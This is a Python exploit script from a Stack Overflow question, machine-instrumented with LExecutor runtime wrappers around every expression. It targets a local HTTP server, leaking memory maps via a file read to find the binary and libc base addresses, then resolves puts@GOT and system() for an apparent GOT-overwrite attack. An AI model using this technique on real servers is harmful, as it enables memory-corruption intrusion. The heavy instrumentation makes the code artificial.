# LExecutor: DO NOT INSTRUMENT

#Source: https://stackoverflow.com/questions/61990373/typeerror-init-got-an-unexpected-keyword-argument-checksec
from lexecutor.Runtime import _n_
from lexecutor.Runtime import _a_
from lexecutor.Runtime import _c_
from lexecutor.Runtime import _l_
try:
    from pwn import *
    _l_(547284)

except ImportError:
    pass
try:
    import requests
    _l_(547286)

except ImportError:
    pass

_c_(547288, _n_(547287, "context", lambda: context), arch="i686",os="linux")
_l_(547289)

RHOST = '127.0.0.1'
_l_(547290)
RPORT = '9999'
_l_(547291)

def getFile(file):
    _l_(547304)

    header = {"Range" : "bytes=0-4096"}
    _l_(547292)
    r = _c_(547299, _a_(547294, _n_(547293, "requests", lambda: requests), "get"), f"http://{_n_(547295, 'RHOST', lambda: RHOST)}:{_n_(547296, 'RPORT', lambda: RPORT)}/{_n_(547297, 'file', lambda: file)}",headers=_n_(547298, "header", lambda: header))
    _l_(547300)
    aux = _a_(547302, _n_(547301, "r", lambda: r), "text")
    _l_(547303)
    return aux

#step 1. Find Address                                 #THIS PART WORKS FINE

_c_(547307, _a_(547306, _n_(547305, "log", lambda: log), "info"), "Finding Binary/Libc Location via /proc/self/maps")
_l_(547308)
maps = _c_(547310, _n_(547309, "getFile", lambda: getFile), "/proc/self/maps")
_l_(547311)
addr_bin = _c_(547314, _a_(547313, _n_(547312, "maps", lambda: maps), "split"), '\n')[0][:8]            #addr of httpserver
_l_(547315)            #addr of httpserver
addr_libc = _c_(547318, _a_(547317, _n_(547316, "maps", lambda: maps), "split"), '\n')[6][:8]           #addr of libc.so.6
_l_(547319)           #addr of libc.so.6
_c_(547323, _a_(547321, _n_(547320, "log", lambda: log), "success"), f"Binary is at : 0x{_n_(547322, 'addr_bin', lambda: addr_bin)}")
_l_(547324)
_c_(547328, _a_(547326, _n_(547325, "log", lambda: log), "success"), f"Binary is at : 0x{_n_(547327, 'addr_libc', lambda: addr_libc)}")
_l_(547329)

#step 2. Calculating offsets                           #THIS SECTION ERROR OCCURS

_c_(547332, _a_(547331, _n_(547330, "log", lambda: log), "info"), "Finding the address of PUTS + SYSTEM()")
_l_(547333)
elf = _c_(547335, _n_(547334, "ELF", lambda: ELF), "./httpserver" , checksec=False)             #<----ERROR HERE checksec
_l_(547336)             #<----ERROR HERE checksec
libc = _c_(547338, _n_(547337, "ELF", lambda: ELF), "./libc.so.6.32.self", checksec= False)     #<----ERROR HERE checksec
_l_(547339)     #<----ERROR HERE checksec
_n_(547340, "elf", lambda: elf).address = _c_(547343, _n_(547341, "int", lambda: int), _n_(547342, "addr_bin", lambda: addr_bin), 16)
_l_(547344)
_n_(547345, "libc", lambda: libc).address = _c_(547348, _n_(547346, "int", lambda: int), _n_(547347, "addr_libc", lambda: addr_libc), 16)
_l_(547349)
got_puts = _a_(547351, _n_(547350, "elf", lambda: elf), "got")['puts']                             #<----ERROR HERE puts
_l_(547352)                             #<----ERROR HERE puts
system = _a_(547354, _n_(547353, "libc", lambda: libc), "symbols")['system']
_l_(547355)
_c_(547359, _a_(547357, _n_(547356, "log", lambda: log), "success"), f"Puts@GOT: {_n_(547358, 'got_puts', lambda: got_puts)}")
_l_(547360)
_c_(547364, _a_(547362, _n_(547361, "log", lambda: log), "success"), f"SYSTEM@LIBC: {_n_(547363, 'system', lambda: system)}")
_l_(547365)